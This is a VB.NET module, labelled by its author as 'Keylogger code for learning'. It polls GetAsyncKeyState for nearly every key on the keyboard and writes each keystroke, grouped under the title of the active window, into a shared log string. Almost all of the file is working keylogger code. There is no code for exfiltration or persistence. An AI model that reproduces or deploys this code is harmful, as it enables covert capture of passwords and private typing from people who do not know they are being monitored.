' Dev     : sPk RsK
' Email   : spkrsk.37@gmail.com
' Fanpage : www.facebook.com/sPkAutorunkiller
' Project : Keylogger code for learning
Module FunctionAndSub1
    Private Declare Function GetKeyPress Lib "user32" Alias "GetAsyncKeyState" (ByVal key As Integer) As Integer
    Declare Function GetForegroundWindow Lib "user32.dll" () As Integer
    Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As Integer, ByRef lpdwProcessId As Integer) As Integer
    Dim processID As Integer
    Dim lastestL As Integer = 0
    Dim lastestTitle As String = ""
    Public allLog As String

    Public Function titleToLog() As String
        GetWindowThreadProcessId(GetForegroundWindow(), processID)
        Dim title As String = System.Diagnostics.Process.GetProcessById(processID).MainWindowTitle.ToString()
        If lastestTitle <> title Then
            lastestTitle = title
            Dim newLine As String = ""
            If lastestL = 1 Then
                newLine = vbNewLine
            End If
            allLog = allLog & newLine & "[- " & title & " -]" & vbNewLine
        End If
        Return allLog
    End Function
    Private Function addData(ByVal key As String) As String
        Dim newLine As String
        Dim newLine2 As String
        If (key.Length > 1) Then
            newLine = vbNewLine
        Else
            newLine = ""
        End If
        If (lastestL = 0) Then
            newLine2 = ""
        ElseIf (lastestL = 1 And key.Length > 1) Then
            newLine2 = vbNewLine
        Else
            newLine2 = ""
        End If
        lastestL = key.Length
        allLog = allLog & newLine2 & key & newLine
        Return allLog
    End Function
    Public Sub checkkey()

        If GetKeyPress(Keys.A) Then
            addData("A")

        ElseIf GetKeyPress(Keys.Add) Then
            addData("+")

        ElseIf GetKeyPress(Keys.Alt) Then
            addData("[ALT]")

        ElseIf GetKeyPress(Keys.Apps) Then
            addData("[APPS]")

        ElseIf GetKeyPress(Keys.Attn) Then
            addData("[ATTN]")

        ElseIf GetKeyPress(Keys.B) Then
            addData("B")

        ElseIf GetKeyPress(Keys.Back) Then
            addData("[BACK-SPACE]")

        ElseIf GetKeyPress(Keys.BrowserBack) Then
            addData("[BROWSER-BACK]")

        ElseIf GetKeyPress(Keys.BrowserFavorites) Then
            addData("[BROWSER-FAVORITES]")

        ElseIf GetKeyPress(Keys.BrowserForward) Then
            addData("[BROWSER-FORWARD]")

        ElseIf GetKeyPress(Keys.BrowserHome) Then
            addData("[BROWSER-HOME]")

        ElseIf GetKeyPress(Keys.BrowserRefresh) Then
            addData("[BROWSER-REFRESH]")

        ElseIf GetKeyPress(Keys.BrowserSearch) Then
            addData("[BROWSER-SEARCH]")

        ElseIf GetKeyPress(Keys.BrowserStop) Then
            addData("[BROWSER-STOP]")

        ElseIf GetKeyPress(Keys.C) Then
            addData("C")

        ElseIf GetKeyPress(Keys.Cancel) Then
            addData("[CANCLE]")

        ElseIf GetKeyPress(Keys.Capital) Then
            'addData("[CAPITAL]") Capslock

        ElseIf GetKeyPress(Keys.CapsLock) Then
            addData("[CAPSLOCK]")

        ElseIf GetKeyPress(Keys.Clear) Then
            addData("[CLEAR]")

        ElseIf GetKeyPress(Keys.Control) Then
            addData("[CONTROL]")

        ElseIf GetKeyPress(Keys.ControlKey) Then
            'addData("[CONTROL-KEY]")

        ElseIf GetKeyPress(Keys.Crsel) Then
            addData("[CRSEL]")

        ElseIf GetKeyPress(Keys.D) Then
            addData("D")

        ElseIf GetKeyPress(Keys.D0) Then
            addData("0")

        ElseIf GetKeyPress(Keys.D1) Then
            addData("1")

        ElseIf GetKeyPress(Keys.D2) Then
            addData("2")

        ElseIf GetKeyPress(Keys.D3) Then
            addData("3")

        ElseIf GetKeyPress(Keys.D4) Then
            addData("4")

        ElseIf GetKeyPress(Keys.D5) Then
            addData("5")

        ElseIf GetKeyPress(Keys.D6) Then
            addData("6")

        ElseIf GetKeyPress(Keys.D7) Then
            addData("7")

        ElseIf GetKeyPress(Keys.D8) Then
            addData("8")

        ElseIf GetKeyPress(Keys.D9) Then
            addData("9")

        ElseIf GetKeyPress(Keys.Decimal) Then
            addData(".")

        ElseIf GetKeyPress(Keys.Delete) Then
            addData("[DELETE]")

        ElseIf GetKeyPress(Keys.Divide) Then
            addData("/")

        ElseIf GetKeyPress(Keys.Down) Then
            addData("[DOWN]")

        ElseIf GetKeyPress(Keys.E) Then
            addData("E")

        ElseIf GetKeyPress(Keys.End) Then
            addData("[END]")

        ElseIf GetKeyPress(Keys.Enter) Then
            addData("[ENTER]")

        ElseIf GetKeyPress(Keys.EraseEof) Then
            addData("[ERASE-EOF]")

        ElseIf GetKeyPress(Keys.Escape) Then
            addData("[ESCAPE]")

        ElseIf GetKeyPress(Keys.Execute) Then
            addData("[EXECUTE]")

        ElseIf GetKeyPress(Keys.Exsel) Then
            addData("[EXSEL]")

        ElseIf GetKeyPress(Keys.F) Then
            addData("F")

        ElseIf GetKeyPress(Keys.F1) Then
            addData("[F1]")

        ElseIf GetKeyPress(Keys.F10) Then
            addData("[F10]")

        ElseIf GetKeyPress(Keys.F11) Then
            addData("[F11]")

        ElseIf GetKeyPress(Keys.F12) Then
            addData("[F12]")

        ElseIf GetKeyPress(Keys.F13) Then
            addData("[F13]")

        ElseIf GetKeyPress(Keys.F14) Then
            addData("[F14]")

        ElseIf GetKeyPress(Keys.F15) Then
            addData("[F15]")

        ElseIf GetKeyPress(Keys.F16) Then
            addData("[F16]")

        ElseIf GetKeyPress(Keys.F17) Then
            addData("[F17]")

        ElseIf GetKeyPress(Keys.F18) Then
            addData("[F18]")

        ElseIf GetKeyPress(Keys.F19) Then
            addData("[F19]")

        ElseIf GetKeyPress(Keys.F2) Then
            addData("[F2]")

        ElseIf GetKeyPress(Keys.F20) Then
            addData("[F20]")

        ElseIf GetKeyPress(Keys.F21) Then
            addData("[F21]")

        ElseIf GetKeyPress(Keys.F22) Then
            addData("[F22]")

        ElseIf GetKeyPress(Keys.F23) Then
            addData("[F23]")

        ElseIf GetKeyPress(Keys.F24) Then
            addData("[F24]")

        ElseIf GetKeyPress(Keys.F3) Then
            addData("[F3]")

        ElseIf GetKeyPress(Keys.F4) Then
            addData("[F4]")

        ElseIf GetKeyPress(Keys.F5) Then
            addData("[F5]")

        ElseIf GetKeyPress(Keys.F6) Then
            addData("[F6]")

        ElseIf GetKeyPress(Keys.F7) Then
            addData("[F7]")

        ElseIf GetKeyPress(Keys.F8) Then
            addData("[F8]")

        ElseIf GetKeyPress(Keys.F9) Then
            addData("[F9]")

        ElseIf GetKeyPress(Keys.FinalMode) Then
            addData("[FINAL-MODE]")

        ElseIf GetKeyPress(Keys.G) Then
            addData("G")

        ElseIf GetKeyPress(Keys.H) Then
            addData("H")

        ElseIf GetKeyPress(Keys.HanguelMode) Then
            addData("[HANGUEL-MODE]")

        ElseIf GetKeyPress(Keys.HangulMode) Then
            addData("[HANGUL-MODE]")

        ElseIf GetKeyPress(Keys.HanjaMode) Then
            addData("[HANJA-MODE]")

        ElseIf GetKeyPress(Keys.Help) Then
            addData("[HELP]")

        ElseIf GetKeyPress(Keys.Home) Then
            addData("[HOME]")

        ElseIf GetKeyPress(Keys.I) Then
            addData("I")

        ElseIf GetKeyPress(Keys.IMEAccept) Then
            addData("[IME-ACCEPT]")

        ElseIf GetKeyPress(Keys.IMEAceept) Then
            addData("[IME-ACEEPT]")

        ElseIf GetKeyPress(Keys.IMEConvert) Then
            addData("[IME-CONVERT]")

        ElseIf GetKeyPress(Keys.IMEModeChange) Then
            addData("[IME-MODE-CHANGE]")

        ElseIf GetKeyPress(Keys.IMENonconvert) Then
            addData("[IME-NON-CONVERT]")

        ElseIf GetKeyPress(Keys.Insert) Then
            addData("[INSERT]")

        ElseIf GetKeyPress(Keys.J) Then
            addData("J")

        ElseIf GetKeyPress(Keys.JunjaMode) Then
            addData("[JUNJA-MODE]")

        ElseIf GetKeyPress(Keys.K) Then
            addData("K")

        ElseIf GetKeyPress(Keys.KanaMode) Then
            addData("[KANA-MODE]")

        ElseIf GetKeyPress(Keys.KanjiMode) Then
            addData("[KANJI-MODE]")

        ElseIf GetKeyPress(Keys.KeyCode) Then
            addData("[KEY-CODE]")

        ElseIf GetKeyPress(Keys.L) Then
            addData("L")

        ElseIf GetKeyPress(Keys.LaunchApplication1) Then
            addData("[LAUNCH-APPLICATION1]")

        ElseIf GetKeyPress(Keys.LaunchApplication2) Then
            addData("[LAUNCH-APPLICATION2]")

        ElseIf GetKeyPress(Keys.LaunchMail) Then
            addData("[LAUNCH-MAIL]")

        ElseIf GetKeyPress(Keys.LButton) Then
            'addData("[LEFT-BUTTON]")

        ElseIf GetKeyPress(Keys.LControlKey) Then
            addData("[LEFT-CONTROL-KEY]")

        ElseIf GetKeyPress(Keys.Left) Then
            addData("[LEFT]")

        ElseIf GetKeyPress(Keys.LineFeed) Then
            addData("[LINE-FEED]")

        ElseIf GetKeyPress(Keys.LMenu) Then
            addData("[LEFT-ALT]")

        ElseIf GetKeyPress(Keys.LShiftKey) Then
            addData("[LEFT-SHIFTf-KEY]")

        ElseIf GetKeyPress(Keys.LWin) Then
            addData("[LEFT-WINDOWS]")

        ElseIf GetKeyPress(Keys.M) Then
            addData("M")

        ElseIf GetKeyPress(Keys.MButton) Then
            addData("[M-BUTTON]")

        ElseIf GetKeyPress(Keys.MediaNextTrack) Then
            addData("[MEDIA-NEXT-TRACK]")

        ElseIf GetKeyPress(Keys.MediaPlayPause) Then
            addData("[MEDIA-PLAY-PAUSE]")

        ElseIf GetKeyPress(Keys.MediaPreviousTrack) Then
            addData("[MEDIA-PREVIOUS-TRACK]")

        ElseIf GetKeyPress(Keys.MediaStop) Then
            addData("[MEDIA-STOP]")

        ElseIf GetKeyPress(Keys.Menu) Then
            'addData("[MENU-KEY]") ALT

        ElseIf GetKeyPress(Keys.Modifiers) Then
            addData("[MODIFIERS]")

        ElseIf GetKeyPress(Keys.Multiply) Then
            addData("*")

        ElseIf GetKeyPress(Keys.N) Then
            addData("N")

        ElseIf GetKeyPress(Keys.Next) Then
            addData("[NEXT]")

        ElseIf GetKeyPress(Keys.NoName) Then
            addData("[NO-NAME]")

        ElseIf GetKeyPress(Keys.None) Then
            addData("[NONE]")

        ElseIf GetKeyPress(Keys.NumLock) Then
            addData("[NUM-LOCK]")

        ElseIf GetKeyPress(Keys.NumPad0) Then
            addData("0")

        ElseIf GetKeyPress(Keys.NumPad1) Then
            addData("1")

        ElseIf GetKeyPress(Keys.NumPad2) Then
            addData("2")

        ElseIf GetKeyPress(Keys.NumPad3) Then
            addData("3")

        ElseIf GetKeyPress(Keys.NumPad4) Then
            addData("4")

        ElseIf GetKeyPress(Keys.NumPad5) Then
            addData("5")

        ElseIf GetKeyPress(Keys.NumPad6) Then
            addData("6")

        ElseIf GetKeyPress(Keys.NumPad7) Then
            addData("7")

        ElseIf GetKeyPress(Keys.NumPad8) Then
            addData("8")

        ElseIf GetKeyPress(Keys.NumPad9) Then
            addData("9")

        ElseIf GetKeyPress(Keys.O) Then
            addData("O")

        ElseIf GetKeyPress(Keys.Oem1) Then
            addData("[OEM1]")

        ElseIf GetKeyPress(Keys.Oem102) Then
            addData("[OEM102]")

        ElseIf GetKeyPress(Keys.Oem2) Then
            addData("/")

        ElseIf GetKeyPress(Keys.Oem3) Then
            addData("~")

        ElseIf GetKeyPress(Keys.Oem4) Then
            addData("[")

        ElseIf GetKeyPress(Keys.Oem5) Then
            addData("\")

        ElseIf GetKeyPress(Keys.Oem6) Then
            addData("]")

        ElseIf GetKeyPress(Keys.Oem7) Then
            addData("[OEM7]")

        ElseIf GetKeyPress(Keys.Oem8) Then
            addData("[OEM8]")

        ElseIf GetKeyPress(Keys.OemBackslash) Then
            addData("\")

        ElseIf GetKeyPress(Keys.OemClear) Then
            addData("[OEM-CLEAR]")

        ElseIf GetKeyPress(Keys.OemCloseBrackets) Then
            addData(")")

        ElseIf GetKeyPress(Keys.Oemcomma) Then
            addData(",")

        ElseIf GetKeyPress(Keys.OemMinus) Then
            addData("-")

        ElseIf GetKeyPress(Keys.OemOpenBrackets) Then
            addData("(")

        ElseIf GetKeyPress(Keys.OemPeriod) Then
            addData("OEM-PERIOD")

        ElseIf GetKeyPress(Keys.OemPipe) Then
            addData("OEM-PIPE")

        ElseIf GetKeyPress(Keys.Oemplus) Then
            addData("+")

        ElseIf GetKeyPress(Keys.OemQuestion) Then
            addData("?")

        ElseIf GetKeyPress(Keys.OemQuotes) Then
            addData("""")

        ElseIf GetKeyPress(Keys.OemSemicolon) Then
            addData(";")

        ElseIf GetKeyPress(Keys.Oemtilde) Then
            addData("~")

        ElseIf GetKeyPress(Keys.P) Then
            addData("P")

        ElseIf GetKeyPress(Keys.Pa1) Then
            addData("[PA1]")

        ElseIf GetKeyPress(Keys.Packet) Then
            addData("[PACKET]")

        ElseIf GetKeyPress(Keys.PageDown) Then
            addData("[PAGE-DOWN]")

        ElseIf GetKeyPress(Keys.PageUp) Then
            addData("[PAGE-UP]")

        ElseIf GetKeyPress(Keys.Pause) Then
            addData("[PAUSE]")

        ElseIf GetKeyPress(Keys.Play) Then
            addData("[PLAY]")

        ElseIf GetKeyPress(Keys.Print) Then
            addData("[PRINT]")

        ElseIf GetKeyPress(Keys.PrintScreen) Then
            addData("[PRINT-SCREEN]")

        ElseIf GetKeyPress(Keys.Prior) Then
            addData("[PRIOR]")

        ElseIf GetKeyPress(Keys.ProcessKey) Then
            addData("[PROCESS-KEY]")

        ElseIf GetKeyPress(Keys.Q) Then
            addData("Q")

        ElseIf GetKeyPress(Keys.R) Then
            addData("R")

        ElseIf GetKeyPress(Keys.RButton) Then
            addData("[RIGHT-BUTTON]")

        ElseIf GetKeyPress(Keys.RControlKey) Then
            addData("[RIGHT-CONTROL-KEY]")

        ElseIf GetKeyPress(Keys.Return) Then
            addData("[RETURN]")
        ElseIf GetKeyPress(Keys.Right) Then
            addData("[RIGHT]")
        ElseIf GetKeyPress(Keys.RMenu) Then
            addData("[RIGHT-ALT]")
        ElseIf GetKeyPress(Keys.RShiftKey) Then
            addData("[RIGHT-SHIFT-KEY]")
        ElseIf GetKeyPress(Keys.RWin) Then
            addData("[RINHT-WINDOWS]")
        ElseIf GetKeyPress(Keys.S) Then
            addData("S")
        ElseIf GetKeyPress(Keys.Scroll) Then
            addData("[SCROLL]")
        ElseIf GetKeyPress(Keys.Select) Then
            addData("[SELECT]")
        ElseIf GetKeyPress(Keys.SelectMedia) Then
            addData("[SELECT-MEDIA]")
        ElseIf GetKeyPress(Keys.Separator) Then
            addData("[SEPARATOR]")
        ElseIf GetKeyPress(Keys.Sleep) Then
            addData("[SLEEP]")
        ElseIf GetKeyPress(Keys.Snapshot) Then
            addData("[SNAPSHOT]")
        ElseIf GetKeyPress(Keys.Space) Then
            addData(" ")
        ElseIf GetKeyPress(Keys.Subtract) Then
            addData("-")
        ElseIf GetKeyPress(Keys.T) Then
            addData("T")
        ElseIf GetKeyPress(Keys.Tab) Then
            addData("[TAB]")
        ElseIf GetKeyPress(Keys.U) Then
            addData("U")
        ElseIf GetKeyPress(Keys.Up) Then
            addData("[UP]")
        ElseIf GetKeyPress(Keys.V) Then
            addData("V")
        ElseIf GetKeyPress(Keys.VolumeDown) Then
            addData("[VOLUME-DOWN]")
        ElseIf GetKeyPress(Keys.VolumeMute) Then
            addData("[VOLUME-MUTE]")
        ElseIf GetKeyPress(Keys.VolumeUp) Then
            addData("[VOLUME-UP]")
        ElseIf GetKeyPress(Keys.W) Then
            addData("W")
        ElseIf GetKeyPress(Keys.X) Then
            addData("X")
        ElseIf GetKeyPress(Keys.XButton1) Then
            addData("[X-BUTTON1]")
        ElseIf GetKeyPress(Keys.XButton2) Then
            addData("[X-BUTTON2]")
        ElseIf GetKeyPress(Keys.Y) Then
            addData("Y")
        ElseIf GetKeyPress(Keys.Z) Then
            addData("Z")
        ElseIf GetKeyPress(Keys.Zoom) Then
            addData("[ZOOM]")
        End If
    End Sub
End Module
